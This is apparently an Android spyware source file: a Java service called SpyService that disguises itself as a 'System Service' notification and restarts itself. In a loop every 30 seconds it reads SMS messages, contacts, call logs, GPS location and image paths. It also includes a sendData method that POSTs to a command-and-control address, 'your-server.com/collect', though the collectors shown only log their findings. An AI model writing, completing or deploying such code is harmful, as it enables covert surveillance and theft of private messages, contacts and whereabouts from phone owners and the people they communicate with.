package com.example.spyapp;

import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

public class SpyService extends Service {
    private static final String C2_SERVER = "http://your-server.com/collect";

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        createNotificationChannel();
        android.app.Notification notification = new android.app.Notification.Builder(this, "CHANNEL_ID")
                .setContentTitle("System Service")
                .setContentText("Running...")
                .setSmallIcon(android.R.drawable.ic_menu_info_details)
                .build();
        startForeground(1, notification);

        new Thread(() -> {
            while (true) {
                try {
                    collectSMS();
                    collectContacts();
                    collectLocation();
                    collectCallLogs();
                    collectImages();
                    Thread.sleep(30000);
                } catch (Exception e) {
                }
            }
        }).start();
        return START_STICKY;
    }

    private void collectImages() {
        try {
            android.net.Uri uri = android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
            String[] projection = {
                    android.provider.MediaStore.Images.Media.DISPLAY_NAME,
                    android.provider.MediaStore.Images.Media.DATA
            };
            android.database.Cursor cursor = getContentResolver().query(uri, projection, null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                Log.d("SpyApp", "--- Images Found ---");
                do {
                    String name = cursor.getString(
                            cursor.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.DISPLAY_NAME));
                    String path = cursor
                            .getString(cursor.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.DATA));
                    Log.d("SpyApp", "Image: " + name + " | Path: " + path);
                } while (cursor.moveToNext());
                cursor.close();
            }
        } catch (Exception e) {
            Log.e("SpyApp", "Error collecting Images", e);
        }
    }

    private void createNotificationChannel() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            android.app.NotificationChannel serviceChannel = new android.app.NotificationChannel(
                    "CHANNEL_ID",
                    "System Service Channel",
                    android.app.NotificationManager.IMPORTANCE_DEFAULT);
            android.app.NotificationManager manager = getSystemService(android.app.NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(serviceChannel);
            }
        }
    }

    private void sendData(String data) {
        try {
            URL url = new URL(C2_SERVER);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.getOutputStream().write(data.getBytes());
            conn.getInputStream().close();
        } catch (Exception e) {
        }
    }

    private void collectSMS() {
        try {
            android.database.Cursor cursor = getContentResolver().query(android.provider.Telephony.Sms.CONTENT_URI,
                    null, null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String address = cursor
                            .getString(cursor.getColumnIndexOrThrow(android.provider.Telephony.Sms.ADDRESS));
                    String body = cursor.getString(cursor.getColumnIndexOrThrow(android.provider.Telephony.Sms.BODY));
                    Log.d("SpyApp", "SMS from: " + address + ", Body: " + body);
                } while (cursor.moveToNext());
                cursor.close();
            }
        } catch (Exception e) {
            Log.e("SpyApp", "Error collecting SMS", e);
        }
    }

    private void collectContacts() {
        try {
            android.database.Cursor cursor = getContentResolver()
                    .query(android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(
                            android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                    String number = cursor.getString(cursor
                            .getColumnIndexOrThrow(android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER));
                    Log.d("SpyApp", "Contact: " + name + ", Number: " + number);
                } while (cursor.moveToNext());
                cursor.close();
            }
        } catch (Exception e) {
            Log.e("SpyApp", "Error collecting Contacts", e);
        }
    }

    private void collectCallLogs() {
        try {
            android.database.Cursor cursor = getContentResolver().query(android.provider.CallLog.Calls.CONTENT_URI,
                    null, null, null, null);
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    String number = cursor
                            .getString(cursor.getColumnIndexOrThrow(android.provider.CallLog.Calls.NUMBER));
                    String type = cursor.getString(cursor.getColumnIndexOrThrow(android.provider.CallLog.Calls.TYPE));
                    Log.d("SpyApp", "Call Log: " + number + " Type: " + type);
                } while (cursor.moveToNext());
                cursor.close();
            }
        } catch (Exception e) {
            Log.e("SpyApp", "Error collecting CallLogs", e);
        }
    }

    private void collectLocation() {
        try {
            android.location.LocationManager lm = (android.location.LocationManager) getSystemService(
                    android.content.Context.LOCATION_SERVICE);
            if (checkSelfPermission(
                    android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                android.location.Location location = lm
                        .getLastKnownLocation(android.location.LocationManager.GPS_PROVIDER);
                if (location != null) {
                    Log.d("SpyApp", "Location: " + location.getLatitude() + ", " + location.getLongitude());
                } else {
                    Log.d("SpyApp", "Location: null (waiting for fix)");
                }
            }
        } catch (Exception e) {
            Log.e("SpyApp", "Error collecting Location", e);
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
